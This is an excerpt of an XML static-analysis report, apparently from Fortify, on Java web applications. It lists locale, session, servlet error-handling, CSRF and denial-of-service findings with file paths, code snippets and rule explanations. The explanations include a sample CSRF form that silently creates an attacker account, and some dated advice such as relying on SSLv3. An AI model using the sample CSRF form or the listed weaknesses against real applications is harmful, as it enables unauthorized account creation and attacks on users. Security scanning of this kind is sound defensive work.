                    l_objSession.setAttribute("UserLoggedIn", b_objSessionBinder);                    
                    
                    authenticationDAO.loadUserPrivileges(m_sUserProfileName,l_objSecurityMgr);</Snippet>
<TargetFunction>FunctionCall: setAttribute()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7FF698C11B46A9C955926BCBC490460E" ruleID="7F7E0FDE-A69E-4F6F-91DB-F75A45091CC1">
                            <Category>J2EE Bad Practices: Non-Serializable Object Stored in Session</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method saveCurrentRecord() in LoginRequestHandler.java stores a non-serializable object as an HttpSession attribute, which can damage application reliability.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LoginRequestHandler.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/web/action/LoginRequestHandler.java</FilePath>
<LineStart>115</LineStart>
<Snippet>                    l_objSecurityMgr = new SecurityAccessManager(m_sUserLoginID, m_sUserDomainID);
                    //set the user details in session for the first time.
                    l_objSession.setAttribute(CommonConstants.ATTR_SECURITY_MANAGER,
                            l_objSecurityMgr);
                    p_objRequest.getSession().setAttribute(CommonConstants.ATTR_USER_DETAILS,</Snippet>
<TargetFunction>FunctionCall: setAttribute()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="10">
                        <groupTitle>Portability Flaw: Locale Dependent Comparison</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The call to equals()  on line 664 causes portability problems because it has different locales which may lead to unexpected output. This may also circumvent custom validation routines.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>When comparing data that may be locale-dependent, an appropriate locale should be specified.

Example 1: The following example tries to perform validation to determine if user input includes a &lt;script&gt; tag.

  ...
  public String tagProcessor(String tag){
    if (tag.toUpperCase().equals("SCRIPT")){
      return null;
    }
    //does not contain SCRIPT tag, keep processing input
    ...
  }
  ...


The problem with Example 1 is that java.lang.String.toUpperCase() when used without a locale uses the rules of the default locale. Using the Turkish locale "title".toUpperCase() returns "T\u0130TLE", where "\u0130" is the "LATIN CAPITAL LETTER I WITH DOT ABOVE" character. This can lead to unexpected results, such as in Example 1 where this will prevent the word "script" from being caught by this validation, potentially leading to a Cross-Site Scripting vulnerability.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>To prevent this from occurring, always make sure to either specify the default locale, or specify the locale with APIs that accept them such as toUpperCase().

Example 2: The following specifies the locale manually as an argument to toUpperCase().


import java.util.Locale;
  ...
  public String tagProcessor(String tag){
    if (tag.toUpperCase(Locale.ENGLISH).equals("SCRIPT")){
      return null;
    }
    //does not contain SCRIPT tag, keep processing input
    ...
  }
  ...


Example 3: The following uses the function java.lang.String.equalsIgnoreCase() API to prevent this issue.


  ...
  public String tagProcessor(String tag){
    if (tag.equalsIgnoreCase("SCRIPT")){
      return null;
    }
    //does not contain SCRIPT tag, keep processing input
    ...
  }
  ...


This prevents the problem because equalsIgnoreCase() changes case similar to Character.toLowerCase() and Character.toUpperCase(). This involves creating temporary canonical forms of both strings using information from the UnicodeData file that is part of the Unicode Character Database maintained by the Unicode Consortium, and even though this may render them unreadable if they were to be read out, it makes comparison possible without being dependent upon locale.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. If Fortify Static Code Analyzer sees that java.util.Locale.setDefault() is called anywhere in the application, it will assume that the locale has been set accordingly and these issues will also not appear.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>10</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="165ABFC80F4D30F124ECE8DCFF473AAC" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The call to endsWith()  on line 230 causes portability problems because it has different locales which may lead to unexpected output. This may also circumvent custom validation routines.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EditorTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/EditorTag.java</FilePath>
<LineStart>230</LineStart>
<Snippet>			if (files != null) {
				for ( String file : files ) {
					if (file.toUpperCase().endsWith(".GIF") || file.toUpperCase().endsWith(".JPG") || file.toUpperCase().endsWith(".JPEG") || file.toUpperCase().endsWith(".BMP")) {
						if (arrayValues.length() &gt; 0) {
							arrayValues += ", ";</Snippet>
<TargetFunction>file.toUpperCase().endsWith(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BE025129200BD419A8DF5955151C10D9" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The call to equals()  on line 664 causes portability problems because it has different locales which may lead to unexpected output. This may also circumvent custom validation routines.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>664</LineStart>
<Snippet>
            String l_sTempTrimmed = l_sTemp.trim().toUpperCase();
            if (CREATED_DATE.equals(l_sTempTrimmed) ||
                    MODIFIED_DATE.equals(l_sTempTrimmed) ||
                    CYCLE_DATE.equals(l_sTempTrimmed))</Snippet>
<TargetFunction>equals(l_sTempTrimmed) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3C171302606CCEC35C55A30B31CF9828" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The call to endsWith()  on line 230 causes portability problems because it has different locales which may lead to unexpected output. This may also circumvent custom validation routines.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EditorTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/EditorTag.java</FilePath>
<LineStart>230</LineStart>
<Snippet>			if (files != null) {
				for ( String file : files ) {
					if (file.toUpperCase().endsWith(".GIF") || file.toUpperCase().endsWith(".JPG") || file.toUpperCase().endsWith(".JPEG") || file.toUpperCase().endsWith(".BMP")) {
						if (arrayValues.length() &gt; 0) {
							arrayValues += ", ";</Snippet>
<TargetFunction>file.toUpperCase().endsWith(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="ACF0D52A1C0E038A2BC8B65C08E7C072" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The call to endsWith()  on line 230 causes portability problems because it has different locales which may lead to unexpected output. This may also circumvent custom validation routines.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EditorTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/EditorTag.java</FilePath>
<LineStart>230</LineStart>
<Snippet>			if (files != null) {
				for ( String file : files ) {
					if (file.toUpperCase().endsWith(".GIF") || file.toUpperCase().endsWith(".JPG") || file.toUpperCase().endsWith(".JPEG") || file.toUpperCase().endsWith(".BMP")) {
						if (arrayValues.length() &gt; 0) {
							arrayValues += ", ";</Snippet>
<TargetFunction>file.toUpperCase().endsWith(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="58744CE30F7CA918FA1B87818C392FF0" ruleID="D8E9ED3B-22EC-4CBA-98C8-7C67F73CCF4C">
                            <Category>Portability Flaw: Locale Dependent Comparison</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The call to endsWith()  on line 230 causes portability problems because it has different locales which may lead to unexpected output. This may also circumvent custom validation routines.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EditorTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/EditorTag.java</FilePath>
<LineStart>230</LineStart>
<Snippet>			if (files != null) {
				for ( String file : files ) {
					if (file.toUpperCase().endsWith(".GIF") || file.toUpperCase().endsWith(".JPG") || file.toUpperCase().endsWith(".JPEG") || file.toUpperCase().endsWith(".BMP")) {
						if (arrayValues.length() &gt; 0) {
							arrayValues += ", ";</Snippet>
<TargetFunction>file.toUpperCase().endsWith(...) : Comparison without checking locale()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="10">
                        <groupTitle>System Information Leak: Incomplete Servlet Error Handling</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The servlet ControlServlet fails to catch all exceptions in doGet(). If a Servlet fails to catch all exceptions, it might reveal debugging information that will help an adversary form a plan of attack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>When a Servlet throws an exception, the default error response the Servlet container sends back to the user typically includes debugging information. This information is of great value to an attacker. For example, a stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.

Example 1: In the following method a DNS lookup failure will cause the Servlet to throw an exception.


protected void doPost (HttpServletRequest req,
                    HttpServletResponse res)
              throws IOException {
    String ip = req.getRemoteAddr();
    InetAddress addr = InetAddress.getByName(ip);
    ...
    out.println("hello " + addr.getHostName());
}


Example 2: The following method will throw a NullPointerException if the parameter "name" is not part of the request.


protected void doPost (HttpServletRequest req,
                    HttpServletResponse res)
              throws IOException {
    String name = getParameter("name");
    ...
    out.println("hello " + name.trim());
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>All top-level Servlet methods should catch Throwable, thereby minimizing the chance that the Servlet's error response mechanism is invoked.

Example 3: The method from Example 1 should be rewritten as follows:


protected void doPost (HttpServletRequest req,
                    HttpServletResponse res) {
      try {
          String ip = req.getRemoteAddr();
          InetAddress addr = InetAddress.getByName(ip);
      ...
          out.println("hello " + addr.getHostName());
      }catch (Throwable t) {
          logger.error("caught throwable at top level", t);
      }
  }
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>10</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="DA526520227FD903ED7DFED0BDA2F539" ruleID="97B9518A-F1BC-44CE-BEB1-D5FBDDFCCF9D">
                            <Category>System Information Leak: Incomplete Servlet Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The servlet ShowAttachmentServlet fails to catch all exceptions in doGet(). If a Servlet fails to catch all exceptions, it might reveal debugging information that will help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ShowAttachmentServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/common/attachment/handler/ShowAttachmentServlet.java</FilePath>
<LineStart>60</LineStart>
<Snippet>	 * @exception IOException is thrown if an IOException occurs.
	 */
    public void doGet(HttpServletRequest p_objRequest, HttpServletResponse p_objResponse) throws ServletException, IOException
    {
        serviceRequest(p_objRequest,p_objResponse);</Snippet>
<TargetFunction>Function: doGet()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3A216701D6249DA7DFFC536F0F546B89" ruleID="97B9518A-F1BC-44CE-BEB1-D5FBDDFCCF9D">
                            <Category>System Information Leak: Incomplete Servlet Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The servlet ShowAttachmentServlet fails to catch all exceptions in doPost(). If a Servlet fails to catch all exceptions, it might reveal debugging information that will help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ShowAttachmentServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/common/attachment/handler/ShowAttachmentServlet.java</FilePath>
<LineStart>72</LineStart>
<Snippet>	 * @param p_objResponse The HTTPServletResponse object.
	 */
    public void doPost(HttpServletRequest p_objRequest, HttpServletResponse p_objResponse) throws ServletException, IOException
    {
        serviceRequest(p_objRequest,p_objResponse);</Snippet>
<TargetFunction>Function: doPost()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DC301819CFE2415DFA496DB20BC27514" ruleID="97B9518A-F1BC-44CE-BEB1-D5FBDDFCCF9D">
                            <Category>System Information Leak: Incomplete Servlet Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The servlet ControlServlet fails to catch all exceptions in doGet(). If a Servlet fails to catch all exceptions, it might reveal debugging information that will help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ControlServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/base/ControlServlet.java</FilePath>
<LineStart>247</LineStart>
<Snippet>     * @throws IOException      is thrown if an exception occurs
     */
    public void doGet(HttpServletRequest request,
                      HttpServletResponse response)
            throws ServletException, IOException {</Snippet>
<TargetFunction>Function: doGet()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="551FC2F32B3D2877C7AC1C82DD301EFA" ruleID="97B9518A-F1BC-44CE-BEB1-D5FBDDFCCF9D">
                            <Category>System Information Leak: Incomplete Servlet Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The servlet ControlServlet fails to catch all exceptions in doPost(). If a Servlet fails to catch all exceptions, it might reveal debugging information that will help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ControlServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/base/ControlServlet.java</FilePath>
<LineStart>272</LineStart>
<Snippet>     * @throws IOException      is thrown if an exception occurs
     */
    public void doPost(HttpServletRequest request,
                       HttpServletResponse response)
            throws ServletException, IOException {</Snippet>
<TargetFunction>Function: doPost()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C2FA4BAA6FF5E7679AFB6F3D045AC3C9" ruleID="97B9518A-F1BC-44CE-BEB1-D5FBDDFCCF9D">
                            <Category>System Information Leak: Incomplete Servlet Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The servlet CNSIControlServlet fails to catch all exceptions in doGet(). If a Servlet fails to catch all exceptions, it might reveal debugging information that will help an adversary form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIControlServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/common/CNSIControlServlet.java</FilePath>
<LineStart>270</LineStart>
<Snippet>     * @throws IOException      is thrown if an IOException occurs.
     */
    public void doGet(HttpServletRequest p_objRequest,
                      HttpServletResponse p_objResponse)
            throws ServletException, IOException {</Snippet>
<TargetFunction>Function: doGet()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="9">
                        <groupTitle>Cross-Site Request Forgery</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The form post at dlgSendResponse.jsp line 16 must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>A cross-site request forgery (CSRF) vulnerability occurs when:
1. A Web application uses session cookies.

2. The application acts on an HTTP request without verifying that the request was made with the user's consent.



A nonce is a cryptographic random value that is sent with a message to prevent replay attacks. If the request does not contain a nonce that proves its provenance, the code that handles the request is vulnerable to a CSRF attack (unless it does not change the state of the application). This means a Web application that uses session cookies has to take special precautions in order to ensure that an attacker can't trick users into submitting bogus requests. Imagine a Web application that allows administrators to create new accounts by submitting this form:


&lt;form method="POST" action="/new_user" &gt;
  Name of new user: &lt;input type="text" name="username"&gt;
  Password for new user: &lt;input type="password" name="user_passwd"&gt;
    &lt;input type="submit" name="action" value="Create User"&gt;
&lt;/form&gt;


An attacker might set up a Web site with the following:


&lt;form method="POST" action="http://www.example.com/new_user"&gt;
  &lt;input type="hidden" name="username" value="hacker"&gt;
  &lt;input type="hidden" name="user_passwd" value="hacked"&gt;
&lt;/form&gt;
&lt;script&gt;
  document.usr_form.submit();
&lt;/script&gt;


If an administrator for example.com visits the malicious page while she has an active session on the site, she will unwittingly create an account for the attacker. This is a CSRF attack. It is possible because the application does not have a way to determine the provenance of the request. Any request could be a legitimate action chosen by the user or a faked action set up by an attacker. The attacker does not get to see the Web page that the bogus request generates, so the attack technique is only useful for requests that alter the state of the application.

Applications that pass the session identifier in the URL rather than as a cookie do not have CSRF problems because there is no way for the attacker to access the session identifier and include it as part of the bogus request.

CSRF is entry number five on the 2007 OWASP Top 10 list.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Applications that use session cookies must include some piece of information in every form post that the back-end code can use to validate the provenance of the request. One way to do that is to include a random request identifier or nonce, as follows:


  RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, "/new_user");
  body = addToPost(body, new_username);
  body = addToPost(body, new_passwd);
  body = addToPost(body, request_id);
  rb.sendRequest(body, new NewAccountCallback(callback));


Then the back-end logic can validate the request identifier before processing the rest of the form data. When possible, the request identifier should be unique to each server request rather than shared across every request for a particular session. As with session identifiers, the harder it is for an attacker to guess the request identifier, the harder it is to conduct a successful CSRF attack. The token should not be easily guessed and it should be protected in the same way that session tokens are protected, such as using SSLv3.

Additional mitigation techniques include:

Framework protection: Most modern web application frameworks embed CSRF protection and they will automatically include and verify CSRF tokens.
Use a Challenge-Response control: Forcing the customer to respond to a challenge sent by the server is a strong defense against CSRF. Some of the challenges that can be used for this purpose are: CAPTCHAs, password re-authentication and one-time tokens.
Check HTTP Referer/Origin headers: An attacker won't be able to spoof these headers while performing a CSRF attack. This makes these headers a useful method to prevent CSRF attacks.
Double-submit Session Cookie: Sending the session ID Cookie as a hidden form value in addition to the actual session ID Cookie is a good protection against CSRF attacks. The server will check both values and make sure they are identical before processing the rest of the form data. If an attacker submits a form in behalf of a user, he won't be able to modify the session ID cookie value as per the same-origin-policy.
Limit Session Lifetime: When accessing protected resources using a CSRF attack, the attack will only be valid as long as the session ID sent as part of the attack is still valid on the server. Limiting the Session lifetime will reduce the probability of a successful attack.

The techniques described here can be defeated with XSS attacks. Effective CSRF mitigation includes XSS mitigation techniques.
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify Static Code Analyzer flags all HTML forms and XMLHttpRequest objects that might perform a POST operation. The auditor must determine if each form could be valuable to an attacker as a CSRF target and whether or not an appropriate mitigation technique is in place.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>9</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="518419EC865EA7B101B3F982D8922BAC" ruleID="114E5A67-3446-4DD5-B578-D0E6FDBB304E">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The HTTP request at groupValidations.js line 55 must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>groupValidations.js</FileName>
<FilePath>EHR-WEBAPP/include/ehr/js/groupValidations.js</FilePath>
<LineStart>55</LineStart>
<Snippet>			$("#showprocessor").children('table').children('tbody').children('tr').children('td').children('h4.redclass').html('Please wait while your group details are validated..');

			$.post(
				actionURL,
				fdata,</Snippet>
<TargetFunction>FunctionPointerCall()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="66D8EC3991EB612A4860B297A2E3E11C" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The form post at ehrONC.jsp line 60 must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ehrONC.jsp</FileName>
<FilePath>ECAMS-WEBAPP/jsp/test/ehrONC.jsp</FilePath>
<LineStart>60</LineStart>
<Snippet>	
%&gt;
&lt;form ID="frmehrONC" NAME="activitiForm" METHOD="post" ACTION="ehrONC.jsp"&gt;
	&lt;Input TYPE="hidden" NAME="action" VALUE=""&gt;&lt;/Input&gt;
	&lt;br&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3AE3BA9F6279D6C74AFBAEFBBA108E15" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The form post at dlgSendResponse.jsp line 16 must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>dlgSendResponse.jsp</FileName>
<FilePath>ECAMS-WEBAPP/jsp/security/dlgSendResponse.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>&lt;/HEAD&gt;
&lt;body&gt;
 &lt;form name = "dummy" action="&lt;%=CommonConstants.VAR_SERVER_URL%&gt;/../ShowAttachmentServlet" &gt;
&lt;SCRIPT LANGUAGE = "JavaScript" &gt;
     dummy.submit();</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6C1E365B4EE04A19126A49C71827ECD5" ruleID="114E5A67-3446-4DD5-B578-D0E6FDBB304E">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The HTTP request at jquery.form.js line 227 must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>jquery.form.js</FileName>
<FilePath>EHR-WEBAPP/include/ehr/js/jquery.form.js</FilePath>
<LineStart>227</LineStart>
<Snippet>        // see:  http://groups.google.com/group/jquery-dev/browse_thread/thread/36395b7ab510dd5d
        if (options.closeKeepAlive) {
            $.get(options.closeKeepAlive, function() {
                jqxhr = fileUploadIframe(a);
            });</Snippet>
<TargetFunction>FunctionPointerCall()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AE50C098BE63D894F255AFA5199BEFF2" ruleID="114E5A67-3446-4DD5-B578-D0E6FDBB304E">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The HTTP request at groupValidations.js line 588 must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>groupValidations.js</FileName>
<FilePath>EHR-WEBAPP/include/ehr/js/groupValidations.js</FilePath>
<LineStart>588</LineStart>
<Snippet>			.html('Please wait while your associated groups are verified with PRISM ...');
	
	$.post(
		actionURL,
		fdata,</Snippet>
<TargetFunction>FunctionPointerCall()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="9">
                        <groupTitle>Denial of Service</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The call to readLine() at CNSIEditorBean.java line 454 might allow an attacker to crash the program or otherwise make it unavailable to legitimate users.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Attackers may be able to deny service to legitimate users by flooding the application with requests, but flooding attacks can often be defused at the network layer. More problematic are bugs that allow an attacker to overload the application using a small number of requests. Such bugs allow the attacker to specify the quantity of system resources their requests will consume or the duration for which they will use them.

Example 1: The following code allows a user to specify the amount of time for which a thread will sleep. By specifying a large number, an attacker may tie up the thread indefinitely. With a small number of requests, the attacker may deplete the application's thread pool.


  int usrSleepTime = Integer.parseInt(usrInput);
  Thread.sleep(usrSleepTime);


Example 2: The following code reads a String from a zip file. Because it uses the readLine() method, it will read an unbounded amount of input. An attacker may take advantage of this code to cause an OutOfMemoryException or to consume a large amount of memory so that the program spends more time performing garbage collection or runs out of memory during some subsequent operation.


  InputStream zipInput = zipFile.getInputStream(zipEntry);
  Reader zipReader = new InputStreamReader(zipInput);
  BufferedReader br = new BufferedReader(zipReader);
  String line = br.readLine();
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Validate user input to ensure that it will not cause inappropriate resource utilization.

Example 3: The following code allows a user to specify the amount of time for which a thread will sleep just as in Example 1, but only if the value is within reasonable bounds.

  int usrSleepTime = Integer.parseInt(usrInput);
  if (usrSleepTime &gt;= SLEEP_MIN &amp;&amp;
      usrSleepTime &lt;= SLEEP_MAX) {
    Thread.sleep(usrSleepTime);
  } else {
    throw new Exception("Invalid sleep duration");
  }
}


Example 4: The following code reads a String from a zip file just as in Example 2, but the maximum string length it will read is MAX_STR_LEN characters.

  InputStream zipInput = zipFile.getInputStream(zipEntry);
  Reader zipReader = new InputStreamReader(zipInput);
  BufferedReader br = new BufferedReader(zipReader);
  StringBuffer sb = new StringBuffer();
  int intC;
  while ((intC = br.read()) != -1) {
    char c = (char) intC;
    if (c == '\n') {
      break;
    }
    if (sb.length() &gt;= MAX_STR_LEN) {
      throw new Exception("input too long");
    }
    sb.append(c);
  }
  String line = sb.toString();
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Denial of service can happen even if the quantity of system resources that will be consumed or the duration for which they will be used is not controlled by an attacker, or at least not directly. Instead, a programmer might choose unsafe constant values for specifying these parameters. The Fortify Secure Coding Rulepacks will report such cases as potential Denial of Services vulnerabilities.

2. The recommended fix for this weakness might not be detectable, and therefore you might need to perform additional auditing after remediation to confirm the fix. After you confirm the weakness is removed, you can safely suppress the issue.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>9</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="6B1D70EC4A958C3420DB6EDE8FACFAED" ruleID="24023E22-D6C7-4D5C-B049-38B7EFC8B408">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The call to readLine() at CNSIEditorBean.java line 454 might allow an attacker to crash the program or otherwise make it unavailable to legitimate users.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIEditorBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIEditorBean.java</FilePath>
<LineStart>454</LineStart>
<Snippet>
			// Read File Line By Line
			while ((strLine = br.readLine()) != null) {
				// Print the content on the console
				htmlString += strLine;</Snippet>
<TargetFunction>readLine()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2614C89D10644503441CF5EC9CC26905" ruleID="24023E22-D6C7-4D5C-B049-38B7EFC8B408">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The call to readLine() at FileUtil.java line 1038 might allow an attacker to crash the program or otherwise make it unavailable to legitimate users.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>1038</LineStart>
<Snippet>        while (linesToFetch-- &gt; 0)
        {
            String l_sEOF = f.readLine();
            if (l_sEOF != null)
            {</Snippet>
<TargetFunction>readLine()</TargetFunction>
                            </Primary>
                        </Issue>
